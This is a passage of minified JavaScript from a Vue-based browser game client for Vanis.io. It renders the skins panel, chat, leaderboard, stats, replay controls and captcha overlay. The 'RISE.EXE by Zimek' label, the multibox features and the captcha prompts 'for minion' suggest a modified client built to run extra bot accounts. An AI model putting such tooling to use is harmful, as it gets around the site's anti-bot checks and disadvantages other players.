                                selected: e.selectedSkinIndex === i
                            },
                            attrs: {
                                src: t,
                                alt: ""
                            },
                            on: {
                                click: function() {
                                    return e.selectSkin(i)
                                },
                                contextmenu: function() {
                                    getModule(4).set("mbSkin", GAME.skinPanel.skins[i]), document.getElementById("skinDisplay2").src = GAME.skinPanel.skins[i], window.SwalAlerts.toast.fire({
                                        type: "info",
                                        title: "Updated multibox skin",
                                        timer: 1500
                                    })
                                }
                            }
                        }), e._v(" "), s("i", {
                            staticClass: "fas fa-times skin-remove-button",
                            on: {
                                click: function() {
                                    return e.removeSkin(i)
                                }
                            }
                        })])
                    }), e._v(" "), s("img", {
                        staticClass: "skin add-skin",
                        attrs: {
                            src: "/img/skin-add.png",
                            alt: ""
                        },
                        on: {
                            click: function() {
                                return e.addSkin()
                            }
                        }
                    })], 2)])
                };
            eT._withStripped = !0;
            var eD = s(1),
                eL = (s(232), Object(v.a)({
                    data: () => ({
                        selectedSkinIndex: 0,
                        skins: [],
                        skinsLoaded: []
                    }),
                    created() {
                        eD.events.$on("skin-url-edit", this.onSkinUrlChanged.bind(this)), this.skins = this.loadSkins() || this.getDefaultSkins();
                        var e = Number(localStorage.selectedSkinIndex) || 0;
                        this.selectSkin(e), GAME.skinPanel = this
                    },
                    methods: {
                        loadSkins() {
                            var e = localStorage.skins;
                            if (!e) return !1;
                            try {
                                var t = JSON.parse(e)
                            } catch (s) {
                                return !1
                            }
                            if (!Array.isArray(t)) return !1;
                            for (var i = t.length; i < 2; i++) t.push("https://skins.vanis.io/s/vanis1");
                            return t
                        },
                        getDefaultSkins() {
                            for (var e = [], t = 0; t < 8; t++) e.push("https://skins.vanis.io/s/vanis1");
                            return e
                        },
                        onSkinUrlChanged(e) {
                            this.$set(this.skins, this.selectedSkinIndex, e), this.saveSkins()
                        },
                        selectSkin(e) {
                            this.selectedSkinIndex = e, localStorage.selectedSkinIndex = e;
                            var t = this.skins[e];
                            eD.events.$emit("skin-click", t)
                        },
                        removeSkin(e) {
                            this.skins.splice(e, 1), this.skins.length < 2 && this.skins.push("https://skins.vanis.io/s/vanis1"), this.saveSkins();
                            var t = Math.max(0, this.selectedSkinIndex - 1);
                            this.selectSkin(t)
                        },
                        addSkin(e) {
                            if (!this.skins.includes(e)) {
                                var t = this.skins.length;
                                this.skins.push(e || "https://skins.vanis.io/s/vanis1"), e || this.selectSkin(t), this.saveSkins()
                            }
                        },
                        saveSkins() {
                            localStorage.skins = JSON.stringify(this.skins)
                        }
                    }
                }, eT, [], !1, null, "1c614894", null));
            eL.options.__file = "src/components/skins.vue";
            var eN = eL.exports,
                eU = s(1),
                eR = (s(234), Object(v.a)({
                    data: () => ({
                        isModalOpen: !1,
                        selectedTab: "servers",
                        gameState: eU.state,
                        cursorStyleElem: null
                    }),
                    methods: {
                        onModalChange: function(e) {
                            this.isModalOpen = e
                        },
                        setCursorUrl(e) {
                            var t = null;
                            e && (t = "#canvas, #hud > * { cursor: url('" + e + "'), auto !important; }"), !t && this.cursorStyleElem ? (this.cursorStyleElem.remove(), this.cursorStyleElem = null) : t && !this.cursorStyleElem && (this.cursorStyleElem = document.createElement("style"), document.head.appendChild(this.cursorStyleElem)), this.cursorStyleElem && (this.cursorStyleElem.innerHTML = t)
                        }
                    },
                    components: {
                        servers: C,
                        playerContainer: ek,
                        account: eM,
                        skins: eN
                    },
                    created() {
                        eU.events.$on("set-cursor-url", e => this.setCursorUrl(e))
                    },
                    mounted() {
                        this.setCursorUrl(eU.settings.cursorImageUrl)
                    }
                }, r, [], !1, null, "ebed1606", null));
            eR.options.__file = "src/components/main-container.vue";
            var eP = eR.exports,
                eF = function() {
                    this.$createElement, this._self._c
                };
            eF._withStripped = !0, s(236);
            var e1 = Object(v.a)({}, eF, [function() {}], !1, null, "4d0670e9", null);
            e1.options.__file = "src/components/social-links.vue";
            var e4 = e1.exports,
                eG = function() {
                    return this.$createElement, this._self._c, this._m(0)
                };
            eG._withStripped = !0;
            var eH = (s(238), Object(v.a)({
                data() {}
            }, eG, [function() {
                var e = this.$createElement,
                    t = this._self._c || e;
                return t("div", {
                    staticClass: "container"
                }, [t("a", {
                    staticStyle: {
                        "margin-left": "20.59px"
                    },
                    attrs: {
                        href: "privacy.html",
                        target: "_blank"
                    }
                }, [this._v("")]), this._v(" "), t("span", {
                    staticClass: "line"
                }, [this._v("")]), this._v(" "), t("a", {
                    attrs: {
                        href: "tos.html",
                        target: "_blank"
                    }
                }, [this._v("")])])
            }], !1, null, "6843da33", null));
            eH.options.__file = "src/components/privacy-tos.vue";
            var e3 = eH.exports,
                e2 = function() {
                    var e = this.$createElement,
                        t = this._self._c || e;
                    return this.show ? t("div", {
                        staticClass: "context-menu fade",
                        style: {
                            top: this.y + "px",
                            left: this.x + "px"
                        }
                    }, [t("div", {
                        staticClass: "player-name"
                    }, [this._v(this._s(this.playerName))]), this._v(" "), t("div", [this._v("Block")]), this._v(" "), t("div", {
                        on: {
                            click: this.hideName
                        }
                    }, [this._v("Hide Name")]), this._v(" "), t("div", {
                        on: {
                            click: this.hideSkin
                        }
                    }, [this._v("Hide Skin")]), this._v(" "), t("div", [this._v("Kick")]), this._v(" "), t("div", [this._v("Ban")]), this._v(" "), t("div", [this._v("Mute")])]) : this._e()
                };
            e2._withStripped = !0, s(1);
            var e9 = (s(240), Object(v.a)({
                data: () => ({
                    show: !1,
                    playerName: "",
                    x: 100,
                    y: 55
                }),
                methods: {
                    open: function(e, t) {
                        this.player = t, this.playerName = t.name, this.x = e.clientX, this.y = e.clientY, this.show = !0, document.addEventListener("click", () => {
                            this.show = !1
                        }, {
                            once: !0
                        })
                    },
                    hideName: function() {
                        this.player.setName(""), this.player.invalidateVisibility()
                    },
                    hideSkin: function() {
                        this.player.setSkin(""), this.player.invalidateVisibility()
                    }
                },
                created() {}
            }, e2, [], !1, null, "4dbee04d", null));
            e9.options.__file = "src/components/context-menu.vue";
            var eO = e9.exports,
                eY = function() {
                    var e = this.$createElement,
                        t = this._self._c || e;
                    return t("div", {
                        attrs: {
                            id: "hud"
                        }
                    }, [t("stats"), this._v(" "), t("chatbox"), this._v(" "), t("leaderboard"), this._v(" "), t("minimap"), this._v(" "), t("cautions")], 1)
                };
            eY._withStripped = !0;
            var e6 = function() {
                let e = this._self._c || this.$createElement,
                    t = this._s,
                    s = this._v,
                    i = this._l,
                    a = this._e;
                return e("div", [e("div", {
                    staticClass: "server-cautions"
                }, i(this.serverInfo, i => e("div", [s(t(i))])), 0), s(" "), e("div", {
                    staticClass: "cautions"
                }, [!this.stopped && this.showMouseFrozen ? e("div", [s("MOUSE FROZEN")]) : a(), s(" "), !this.stopped && this.showMovementStopped ? e("div", [s(`MOVEMENT STOPPED [TAB ${this.showMovementStopped}]`)]) : a(), s(" "), !this.stopped && this.showLinesplitting ? e("div", [s(`LINESPLITTING [TAB ${this.showLinesplitting}]`)]) : a()])])
            };
            e6._withStripped = !0;
            var ez = s(1),
                eW = (s(242), Object(v.a)({
                    data: () => ({
                        showMouseFrozen: !1,
                        showMovementStopped: 0,
                        showLinesplitting: 0,
                        serverInfo: null
                    }),
                    mounted() {
                        ez.events.$on("update-cautions", e => {
                            "mouseFrozen" in e && (this.showMouseFrozen = e.mouseFrozen), "moveToCenterOfCells" in e && (this.showMovementStopped = e.moveToCenterOfCells), "lockLinesplit" in e && (this.showLinesplitting = e.lockLinesplit), "custom" in e && (this.serverInfo = e.custom.split(/\r\n|\r|\n/))
                        }), ez.events.$on("reset-cautions", () => {
                            this.showMouseFrozen = !1, this.showMovementStopped = 0, this.showLinesplitting = 0
                        }), ez.events.$on("game-stopped", () => {
                            this.serverInfo = null
                        })
                    }
                }, e6, [], !1, null, "b7599310", null));
            eW.options.__file = "src/components/cautions.vue";
            var eZ = eW.exports,
                e7 = function() {
                    var e = this.$createElement,
                        t = this._self._c || e;
                    return t("div", {
                        directives: [{
                            name: "show",
                            rawName: "v-show",
                            value: this.visible,
                            expression: "visible"
                        }],
                        staticClass: "stats"
                    }, [t("div", {
                        directives: [{
                            name: "show",
                            rawName: "v-show",
                            value: this.showFPS,
                            expression: "showFPS"
                        }]
                    }, [this._v("RISE.EXE by Zimek")]), this._v(" "), t("div", {
                        directives: [{
                            name: "show",
                            rawName: "v-show",
                            value: !localStorage.hideSignature,
                            expression: "riseSignature"
                        }]
                    }, [this._v("FPS: " + this._s(this.fps || "-"))]), this._v(" "), t("div", {
                        directives: [{
                            name: "show",
                            rawName: "v-show",
                            value: this.showPing,
                            expression: "showPing"
                        }]
                    }, [this._v("Ping: " + this._s(this.ping || "-"))]), this._v(" "), t("div", {
                        directives: [{
                            name: "show",
                            rawName: "v-show",
                            value: this.showPlayerMass && this.mass,
                            expression: "showPlayerMass && mass"
                        }]
                    }, [this._v("Mass: " + this._s(this.mass))]), this._v(" "), t("div", {
                        directives: [{
                            name: "show",
                            rawName: "v-show",
                            value: this.showPlayerScore && this.score,
                            expression: "showPlayerScore && score"
                        }]
                    }, [this._v("Score: " + this._s(this.score))]), this._v(" "), t("div", {
                        directives: [{
                            name: "show",
                            rawName: "v-show",
                            value: this.showCellCount && this.cells,
                            expression: "showCellCount && cells"
                        }]
                    }, [this._v("Cells: " + this._s(this.cells))])])
                };
            e7._withStripped = !0;
            var ej = s(1),
                e5 = s(4),
                eJ = (s(244), Object(v.a)({
                    data: () => ({
                        showFPS: e5.showFPS,
                        showPing: e5.showPing,
                        showPlayerMass: e5.showPlayerMass,
                        showPlayerScore: e5.showPlayerScore,
                        showCellCount: e5.showCellCount,
                        visible: !1,
                        ping: 0,
                        fps: 0,
                        mass: 0,
                        score: 0,
                        cells: 0
                    }),
                    created() {
                        ej.events.$on("stats-visible", e => this.visible = e), ej.events.$on("stats-invalidate-shown", () => {
                            this.showFPS = e5.showFPS, this.showPing = e5.showPing, this.showPlayerMass = e5.showPlayerMass, this.showPlayerScore = e5.showPlayerScore, this.showCellCount = e5.showCellCount
                        }), ej.events.$on("cells-changed", e => this.cells = e), ej.events.$on("stats-changed", e => {
                            this.ping = e.ping || 0, this.fps = e.fps || 0, this.mass = e.mass ? ej.getMassText(e.mass) : 0, this.score = e.score ? ej.getMassText(e.score) : 0
                        })
                    }
                }, e7, [], !1, null, "0875ad82", null));
            eJ.options.__file = "src/components/stats.vue";
            var eK = eJ.exports,
                eV = function() {
                    var e = this,
                        t = e.$createElement,
                        s = e._self._c || t;
                    return s("div", {
                        directives: [{
                            name: "show",
                            rawName: "v-show",
                            value: e.visible,
                            expression: "visible"
                        }],
                        attrs: {
                            id: "chat-container"
                        },
                        on: {
                            click: function(t) {
                                return e.onChatClick(t)
                            },
                            contextmenu: function(t) {
                                return e.onChatRightClick(t)
                            }
                        }
                    }, [e.visibleToast ? [s("transition-group", {
                        attrs: {
                            name: "toast",
                            tag: "div",
                            id: "toast-list"
                        }
                    }, e._l(e.toastMessages, function(t) {
                        return s("span", {
                            key: t.id
                        }, [s("span", {
                            staticClass: "message-row"
                        }, [t.from ? [s("span", {
                            staticClass: "message-from",
                            style: {
                                color: t.fromColor
                            },
                            attrs: {
                                "data-pid": t.pid
                            }
                        }, [e._v(e._s(t.from))]), e._v(":\n                ")] : e._e(), e._v(" "), s("span", {
                            staticClass: "message-text",
                            style: {
                                color: t.textColor
                            }
                        }, [e._v(e._s(t.text))])], 2)])
                    }), 0)] : e._e(), e._v(" "), s("div", {
                        class: {
                            toasts: e.visibleToast,
                            visible: e.visibleInput
                        },
                        attrs: {
                            id: "chatbox"
                        }
                    }, [e.showBlockedMessageCount && e.blockedMessageCount ? s("div", {
                        staticStyle: {
                            position: "absolute",
                            top: "-28px"
                        }
                    }, [e._v("Blocked messages: " + e._s(e.blockedMessageCount))]) : e._e(), e._v(" "), e.visibleToast ? e._e() : [s("div", {
                        ref: "list",
                        attrs: {
                            id: "message-list"
                        }
                    }, e._l(e.messages, function(t, i) {
                        return s("div", {
                            key: i,
                            staticClass: "message-row"
                        }, [t.from ? [s("span", {
                            staticClass: "message-from",
                            style: {
                                color: t.fromColor
                            },
                            attrs: {
                                "data-pid": t.pid
                            }
                        }, [e._v(e._s(t.from))]), e._v(":\n                    ")] : e._e(), e._v(" "), s("span", {
                            staticClass: "message-text",
                            style: {
                                color: t.textColor
                            }
                        }, [e._v(e._s(t.text))])], 2)
                    }), 0)], e._v(" "), s("input", {
                        directives: [{
                            name: "model",
                            rawName: "v-model",
                            value: e.inputText,
                            expression: "inputText"
                        }],
                        ref: "input",
                        attrs: {
                            id: "chatbox-input",
                            type: "text",
                            spellcheck: "false",
                            autocomplete: "off",
                            maxlength: "1000",
                            tabindex: "-1",
                            placeholder: "Type your message here"
                        },
                        domProps: {
                            value: e.inputText
                        },
                        on: {
                            keydown: function(t) {
                                if (!t.type.indexOf("key") && e._k(t.keyCode, "enter", 13, t.key, "Enter")) return null;
                                e.sendChatMessage()
                            },
                            input: function(t) {
                                t.target.composing || (e.inputText = t.target.value)
                            }
                        }
                    })], 2)], 2)
                };
            eV._withStripped = !0;
            var eX = s(1),
                eq = s(4),
                te = s(5),
                {
                    replaceBadWordsChat: tt
                } = s(17),
                ts = {},
                ti = (s(246), Object(v.a)({
                    data: () => ({
                        visible: !1,
                        visibleToast: eq.showChatToast,
                        visibleInput: !1,
                        inputText: "",
                        messages: [],
                        toastMessages: [],
                        showBlockedMessageCount: eq.showBlockedMessageCount,
                        blockedMessageCount: 0,
                        nextMessageId: 0
                    }),
                    methods: {
                        onChatClick(e) {
                            let t = +e.target.dataset.pid;
                            t && (eX.selectedPlayer = t, eX.actions.spectate(t), eX.actions.targetPlayer(t))
                        },
                        onChatRightClick(e) {
                            let t = +e.target.dataset.pid;
                            if (!t) return;
                            let s = eX.playerManager.getPlayer(t);
                            if (!s) return void te.alert("Player does not exist or disconnected");
                            t in ts ? this.confirmUnblockPlayer(s) : this.confirmBlockPlayer(s)
                        },
                        confirmBlockPlayer(e) {
                            te.confirm('Block player "' + e.name + '" until restart?', () => {
                                e.isMe ? te.alert("You can not block yourself") : (ts[e.pid] = e.name, eX.events.$emit("chat-message", 'Blocked player "' + e.name + '"'))
                            })
                        },
                        confirmUnblockPlayer(e) {
                            te.confirm('Unblock player "' + e.name + '"?', () => {
                                delete ts[e.pid], eX.events.$emit("chat-message", 'Unblocked player "' + e.name + '"')
                            })
                        },
                        sendChatMessage() {
                            let e = this.inputText.trim();
                            e && (eX.connection.sendChatMessage(e), this.inputText = ""), eX.renderer.view.focus(), this.scrollBottom(!0)
                        },
                        onChatMessage(e) {
                            if ("string" == typeof e) e = {
                                text: e,
                                textColor: "#828282"
                            };
                            else if (eq.chatColorOnlyPeople && !("fromColor" in e) && !("textColor" in e)) return;
                            if (ts[e.pid]) {
                                this.blockedMessageCount++;
                                return
                            }
                            eq.filterChatMessages && (e.text = tt(e.text)), e.fromColor = e.fromColor || "#ffffff", e.textColor = e.textColor || "#ffffff", this.messages.push(e), this.messages.length > 200 && this.messages.shift(), e.id = this.nextMessageId++, e.until = Date.now() + Math.max(5e3, 150 * e.text.length), this.toastMessages.unshift(e), this.scrollBottom(!1)
                        },
                        onVisibilityChange({
                            visible: e,
                            visibleToast: t
                        }) {
                            null != e && (this.visible = e), null != t && (this.visibleToast = t, this.visibleInput = this.visible && !t), this.$nextTick(() => this.scrollBottom(!0))
                        },
                        focusChat() {
                            this.visible && (this.visibleInput = !0, this.$nextTick(() => this.$refs.input.focus()))
                        },
                        clearChat() {
                            eq.clearChatMessages && (this.messages.splice(0, this.messages.length), this.toastMessages.splice(0, this.toastMessages.length), this.nextMessageId = 0)
                        },
                        scrollBottom(e = !1) {
                            if (!this.visibleToast) {
                                var t = this.$refs.list,
                                    s = t.scrollHeight - t.clientHeight;
                                !e && s - t.scrollTop > 30 || this.$nextTick(() => t.scrollTop = t.scrollHeight)
                            }
                        },
                        filterToasts() {
                            for (var e = 0; e < this.toastMessages.length; e++) this.toastMessages[e].until >= Date.now() || this.toastMessages.splice(e--, 1)
                        }
                    },
                    created() {
                        eX.events.$on("chat-visible", this.onVisibilityChange), eX.events.$on("chat-focus", this.focusChat), eX.events.$on("chat-message", this.onChatMessage), eX.events.$on("server-message", this.onServerMessage), eX.events.$on("every-second", this.filterToasts), eX.events.$on("chat-clear", this.clearChat), eX.events.$on("show-blocked-message-count", e => this.showBlockedMessageCount = e), eX.events.$on("game-stopped", () => {
                            this.blockedMessageCount = 0, ts = {}
                        }), document.addEventListener("focusin", e => {
                            this.visibleInput = !this.visibleToast || e.target === this.$refs.input
                        })
                    }
                }, eV, [], !1, null, "4900a413", null));
            ti.options.__file = "src/components/chatbox.vue";
            var ta = ti.exports,
                tn = function() {
                    var e = this,
                        t = e.$createElement,
                        s = e._self._c || t;
                    return s("div", {
                        directives: [{
                            name: "show",
                            rawName: "v-show",
                            value: e.userVisible && e.visible,
                            expression: "userVisible && visible"
                        }],
                        attrs: {
                            id: "leaderboard"
                        }
                    }, [s("div", {
                        directives: [{
                            name: "show",
                            rawName: "v-show",
                            value: e.headerVisible,
                            expression: "headerVisible"
                        }],
                        staticClass: "leaderboard-title"
                    }, [e._v(e._s(e.headerText))]), e._v(" "), s("div", e._l(e.leaderboard, function(t, i) {
                        return s("div", {
                            key: i,
                            staticClass: "leaderboard-label"
                        }, [e._v(" "), s("span", {
                            class: {
                                spectating: 0 == e.gameState.lifeState
                            },
                            style: {
                                color: t.color,
                                fontWeight: t.bold ? "bold" : "normal"
                            },
                            attrs: {
                                "data-pid": t.pid
                            },
                            on: {
                                click: function(t) {
                                    return e.leftClickLabel(t)
                                }
                            }
                        }, [e._v(e._s(t.text))])])
                    }), 0)])
                };
            tn._withStripped = !0;
            var to = s(1),
                tr = s(4),
                tl = (s(248), Object(v.a)({
                    data: () => ({
                        userVisible: tr.showLeaderboard,
                        visible: !1,
                        headerVisible: !0,
                        headerText: "Leaderboard",
                        leaderboard: [],
                        gameState: to.state
                    }),
                    methods: {
                        updateLeaderboard(e, t) {
                            if (this.leaderboard = e, t) this.headerVisible = t.visible, this.headerText = t.text;
                            else if (tr.showServerName && this.gameState.selectedServer) {
                                this.headerVisible = !0;
                                var s = this.gameState.selectedServer.region || "";
                                s && (s += " "), this.headerText = s + this.gameState.selectedServer.name
                            } else this.headerVisible = !0, this.headerText = "Leaderboard"
                        },
                        leftClickLabel() {
                            let e = event.target.dataset.pid;
                            e && (to.selectedPlayer = e, to.actions.spectate(e), to.actions.targetPlayer(e))
                        },
                        onLeaderboardShow() {
                            this.visible || (to.events.$on("leaderboard-update", this.updateLeaderboard), this.visible = !0)
                        },
                        onLeaderboardHide() {
                            this.visible && (to.events.$off("leaderboard-update", this.updateLeaderboard), this.leaderboard = [], this.visible = !1, this.selectedServer = null)
                        }
                    },
                    created() {
                        to.events.$on("leaderboard-visible", e => {
                            this.userVisible = e
                        }), to.events.$on("leaderboard-show", this.onLeaderboardShow), to.events.$on("leaderboard-hide", this.onLeaderboardHide)
                    }
                }, tn, [], !1, null, "8a0c31c6", null));
            tl.options.__file = "src/components/leaderboard.vue";
            var tc = tl.exports,
                th = {
                    components: {
                        stats: eK,
                        chatbox: ta,
                        minimap: s(117).default,
                        leaderboard: tc,
                        cautions: eZ
                    }
                },
                td = (s(252), Object(v.a)(th, eY, [], !1, null, "339660d2", null));
            td.options.__file = "src/components/hud.vue";
            var tp = td.exports,
                tu = function() {
                    var e = this,
                        t = e.$createElement,
                        s = e._self._c || t;
                    return s("transition", {
                        attrs: {
                            name: "menu"
                        }
                    }, [s("div", {
                        staticClass: "container"
                    }, [s("div", {
                        staticClass: "fade-box box-1"
                    }, [s("div", {
                        staticStyle: {
                            padding: "4px"
                        }
                    }, [e._v("Advertisement")]), e._v(" "), s("div", {
                        staticStyle: {
                            padding: "10px",
                            "padding-top": "0px"
                        }
                    }, [s("div", {
                        attrs: {
                            id: "vanis-io_300x250_2"
                        }
                    })])]), e._v(" "), e.stats ? s("div", {
                        staticClass: "fade-box",
                        class: {
                            scroll: e.isLoadingAd
                        }
                    }, [s("div", {
                        staticStyle: {
                            padding: "15px"
                        }
                    }, [s("div", [e._v("Time Alive: " + e._s(e.timeAlive))]), e._v(" "), s("div", [e._v("Highscore: " + e._s(e.highscore))]), e._v(" "), s("div", [e._v("Players Eaten: " + e._s(e.stats.killCount))]), e._v(" "), s("btn", {
                        staticClass: "continue",
                        nativeOn: {
                            click: function(t) {
                                return e.onContinueClick(t)
                            }
                        }
                    }, [e._v("Continue")])], 1)]) : e._e()])])
                };
            tu._withStripped = !0;
            var tg = s(1),
                tA = s(77),
                tm = (s(254), Object(v.a)({
                    props: ["stats"],
                    data: () => ({
                        isLoadingAd: !1
                    }),
                    computed: {
                        timeAlive() {
                            var e = this.stats.timeAlive;
                            return e < 60 ? e + "s" : Math.floor(e / 60) + "min " + e % 60 + "s"
                        },
                        highscore() {
                            return tg.getMassText(this.stats.highscore)
                        }
                    },
                    methods: {
                        loadAd() {
                            this.isLoadingAd = tA.refreshAd("death-box")
                        },
                        onContinueClick() {
                            tg.state.deathDelay = !1, tg.app.showDeathScreen = !1, tg.showMenu(!0)
                        }
                    },
                    created() {
                        tg.events.$on("refresh-deathscreen-ad", this.loadAd)
                    }
                }, tu, [], !1, null, "3249d726", null));
            tm.options.__file = "src/components/death-stats.vue";
            var tv = tm.exports,
                tf = function() {
                    var e = this.$createElement;
                    return (this._self._c || e)("button", {
                        staticClass: "btn"
                    }, [this._t("default", [this._v("Here should be something")])], 2)
                };
            tf._withStripped = !0;
            var tC = (s(256), Object(v.a)({}, tf, [], !1, null, "b0b10308", null));
            tC.options.__file = "src/components/btn.vue";
            var ty = tC.exports,
                tw = function() {
                    var e = this,
                        t = e.$createElement,
                        s = e._self._c || t;
                    return e.show ? s("div", {
                        class: {
                            "auto-hide": e.autoHideReplayControls
                        },
                        attrs: {
                            id: "replay-controls"
                        }
                    }, [s("div", {
                        staticStyle: {
                            "text-align": "right"
                        }
                    }, [s("div", [e._v("Opacity " + e._s(e.cellOpacity) + "%")]), e._v(" "), s("div", [s("input", {
                        directives: [{
                            name: "model",
                            rawName: "v-model",
                            value: e.cellOpacity,
                            expression: "cellOpacity"
                        }],
                        staticClass: "replay-slider",
                        staticStyle: {
                            width: "105px",
                            display: "inline-block"
                        },
                        attrs: {
                            id: "replay-opacity-slider",
                            type: "range",
                            min: "10",
                            max: "100"
                        },
                        domProps: {
                            value: e.cellOpacity
                        },
                        on: {
                            input: e.onCellOpacitySlide,
                            __r: function(t) {
                                e.cellOpacity = t.target.value
                            }
                        }
                    })])]), e._v(" "), s("div", {
                        staticStyle: {
                            "margin-bottom": "5px",
                            display: "flex"
                        }
                    }, [s("div", {
                        staticStyle: {
                            flex: "1"
                        }
                    }, [e._v(e._s(e.replaySecond.toFixed(1)) + " seconds")]), e._v(" "), s("div", {
                        staticStyle: {
                            "margin-right": "10px"
                        }
                    }, [s("input", {
                        directives: [{
                            name: "model",
                            rawName: "v-model",
                            value: e.autoHideReplayControls,
                            expression: "autoHideReplayControls"
                        }],
                        attrs: {
                            type: "checkbox",
                            id: "replay-auto-hide-controls"
                        },
                        domProps: {
                            checked: Array.isArray(e.autoHideReplayControls) ? e._i(e.autoHideReplayControls, null) > -1 : e.autoHideReplayControls
                        },
                        on: {
                            change: [function(t) {
                                var s = e.autoHideReplayControls,
                                    i = t.target,
                                    a = !!i.checked;
                                if (Array.isArray(s)) {
                                    var n = e._i(s, null);
                                    i.checked ? n < 0 && (e.autoHideReplayControls = s.concat([null])) : n > -1 && (e.autoHideReplayControls = s.slice(0, n).concat(s.slice(n + 1)))
                                } else e.autoHideReplayControls = a
                            }, e.saveAutoHideControls]
                        }
                    }), e._v(" "), s("label", {
                        attrs: {
                            for: "replay-auto-hide-controls"
                        }
                    }, [e._v("Auto Hide Controls")])])]), e._v(" "), s("input", {
                        directives: [{
                            name: "model",
                            rawName: "v-model",
                            value: e.rangeIndex,
                            expression: "rangeIndex"
                        }],
                        staticClass: "replay-slider",
                        attrs: {
                            type: "range",
                            min: e.rangeMin,
                            max: e.rangeMax
                        },
                        domProps: {
                            value: e.rangeIndex
                        },
                        on: {
                            input: e.onSlide,
                            change: e.onSlideEnd,
                            __r: function(t) {
                                e.rangeIndex = t.target.value
                            }
                        }
                    })]) : e._e()
                };
            tw._withStripped = !0;
            var tI = s(1),
                t$ = (s(258), Object(v.a)({
                    data: () => ({
                        show: !1,
                        autoHideReplayControls: tI.settings.autoHideReplayControls,
                        drawDelay: tI.settings.drawDelay,
                        cellOpacity: 100,
                        rangeMin: 0,
                        rangeIndex: 0,
                        rangeMax: 1e3,
                        replaySecond: 0,
                        packetCount: 0
                    }),
                    created: function() {
                        tI.events.$on("show-replay-controls", this.onShow), tI.events.$on("replay-index-change", this.onReplayIndexChange)
                    },
                    methods: {
                        onShow(e) {
                            e ? (this.show = !0, this.packetCount = e) : (this.show = !1, this.cellOpacity = 100, this.rangeIndex = 0, this.packetCount = 0)
                        },
                        onReplayIndexChange(e, t = !0) {
                            var s = e / this.packetCount;
                            t && (this.rangeIndex = Math.floor(s * this.rangeMax)), this.replaySecond = e / 25
                        },
                        onSlide(e) {
                            tI.moveInterval && (clearInterval(tI.moveInterval), tI.moveInterval = null);
                            var t = Math.floor(this.rangeIndex / this.rangeMax * (this.packetCount - 1));
                            tI.playback.seek(t), this.onReplayIndexChange(t, !1)
                        },
                        onSlideEnd(e) {
                            tI.moveInterval || (tI.moveInterval = setInterval(tI.playback.next.bind(tI.playback), 40))
                        },
                        onCellOpacitySlide() {
                            tI.scene.foreground.alpha = this.cellOpacity / 100
                        },
                        saveAutoHideControls() {
                            tI.settings.set("autoHideReplayControls", this.autoHideReplayControls)
                        }
                    }
                }, tw, [], !1, null, "c2c2ac08", null));
            t$.options.__file = "src/components/replay-controls.vue";
            var tk = t$.exports,
                tb = function() {
                    var e = this.$createElement,
                        t = this._self._c || e;
                    return this.show ? t("div", {
                        attrs: {
                            id: "ab-overlay"
                        }
                    }, [this._m(0)]) : this._e()
                };
            tb._withStripped = !0, s(19);
            var {
                isFirstVisit: t_
            } = s(17), tS = (s(260), Object(v.a)({
                data: () => ({
                    show: !1
                }),
                created() {}
            }, tb, [function() {
                var e = this.$createElement,
                    t = this._self._c || e;
                return t("div", {
                    staticClass: "content"
                }, [t("img", {
                    staticStyle: {
                        width: "120px"
                    },
                    attrs: {
                        src: "/img/sad.png"
                    }
                }), this._v(" "), t("p", {
                    staticStyle: {
                        "font-size": "3em"
                    }
                }, [this._v("Adblock Detected")]), this._v(" "), t("p", {
                    staticStyle: {
                        "font-size": "1.5em",
                        "margin-bottom": "15px"
                    }
                }, [this._v("We use advertisements to fund our servers!")]), this._v(" "), t("img", {
                    staticStyle: {
                        "border-radius": "4px",
                        "box-shadow": "0 0 10px black"
                    },
                    attrs: {
                        src: "/img/ab.gif"
                    }
                })])
            }], !1, null, "1611deb4", null));
            tS.options.__file = "src/components/ab-overlay.vue";
            var tE = tS.exports,
                tx = function() {
                    var e = this.$createElement;
                    return (this._self._c || e)("div", {
                        directives: [{
                            name: "show",
                            rawName: "v-show",
                            value: this.show,
                            expression: "show"
                        }],
                        staticClass: "image-captcha-overlay"
                    }, [this._m(0)])
                };
            tx._withStripped = !0;
            var tB = s(1);
            s(25);
            var t8 = window.captcha = {
                    data: () => ({
                        show: !1,
                        scriptLoadPromise: null,
                        captchaId: null,
                        wsId: null,
                        multibox: !1
                    }),
                    created() {
                        tB.events.$on("show-image-captcha", () => {
                            this.multibox = null, this.show = !0, this.wsId = tB.currentWsId, grecaptcha.ready(() => this.renderCaptcha())
                        }), tB.events.$on("m-show-image-captcha", () => {
                            this.multibox = !0, this.show = !0, this.wsId = null, grecaptcha.ready(() => this.renderCaptcha())
                        }), tB.events.$on("request-image-captcha", async () => {
                            this.show = !0, grecaptcha.ready(() => {
                                if (null !== this.captchaId) {
                                    grecaptcha.reset(this.captchaId);
                                    return
                                }
                                let {
                                    client: e
                                } = window, t = document.getElementById("image-captcha-container");
                                this.captchaId = grecaptcha.render(t, {
                                    sitekey: "6LfN7J4aAAAAAPN5k5E2fltSX2PADEyYq6j1WFMi",
                                    callback: e.onCaptchaToken.bind(e)
                                })
                            })
                        }), tB.events.$on("hide-image-captcha", () => {
                            this.show = !1
                        })
                    },
                    methods: {
                        renderCaptcha() {
                            if (null !== this.captchaId) {
                                grecaptcha.reset(this.captchaId);
                                return
                            }
                            this.captchaId = grecaptcha.render(document.getElementById("image-captcha-container"), {
                                sitekey: "6LfN7J4aAAAAAPN5k5E2fltSX2PADEyYq6j1WFMi",
                                callback: this.onCaptchaToken.bind(this)
                            })
                        },
                        onCaptchaToken(e) {
                            if (!this.multibox && tB.currentWsId !== this.wsId) {
                                this.show = !1;
                                return
                            }
                            if (!e) {
                                this.renderCaptcha();
                                return
                            }
                            tB.connection.sendRecaptchaToken(e, !!this.multibox), this.show = !1
                        }
                    }
                },
                t0 = (s(262), Object(v.a)(t8, tx, [function() {
                    let e = this._self._c || this.$createElement,
                        t = this._v,
                        s = window.client || Object.seal({
                            captcha: {
                                solving: !1
                            }
                        });
                    return e("div", {
                        staticClass: "center-screen"
                    }, [e("div", {
                        staticStyle: {
                            "margin-bottom": "6px"
                        }
                    }, [t(s.captcha.solving ? `Solve the captcha for minion '${s.captcha.for}'` : "Login and level up to skip captcha!")]), t(" "), e("div", {
                        attrs: {
                            id: "image-captcha-container"
                        }
                    })])
                }], !1, null, "76d60428", null));
            t0.options.__file = "src/components/image-captcha.vue";
            var tQ = t0.exports,
                tM = function() {
                    var e = this,
                        t = e.$createElement,
                        s = e._self._c || t;
                    return e.show ? s("div", {
                        staticClass: "shoutbox"
                    }, [s("iframe", {
                        staticClass: "shoutbox-player",
                        attrs: {
                            width: "300",
                            height: "200",
                            src: e.url,
